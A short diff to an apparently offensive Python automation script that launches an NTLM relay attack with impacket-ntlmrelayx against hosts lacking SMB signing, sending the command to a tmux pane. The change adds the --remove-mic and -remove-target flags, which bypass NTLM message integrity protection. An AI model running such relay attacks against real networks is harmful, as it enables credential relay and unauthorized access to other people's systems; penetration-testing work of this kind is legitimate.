@@ -149,9 +149,9 @@ def main():
         fileinput.close()
         
         if os.path.exists("/tmp/hosts-signing-false"):
-            command = "impacket-ntlmrelayx -smb2support -socks -tf %s -c '%s'" % ("/tmp/hosts-signing-false.txt", relayx_command)
+            command = "impacket-ntlmrelayx --remove-mic -remove-target -smb2support -socks -tf %s -c '%s'" % ("/tmp/hosts-signing-false.txt", relayx_command)
         else:
-            command = "impacket-ntlmrelayx -smb2support -socks -c '%s'" % (relayx_command)
+            command = "impacket-ntlmrelayx --remove-mic -remove-target -smb2support -socks -c '%s'" % (relayx_command)
             
         
         tmux_pane.send_keys(command)
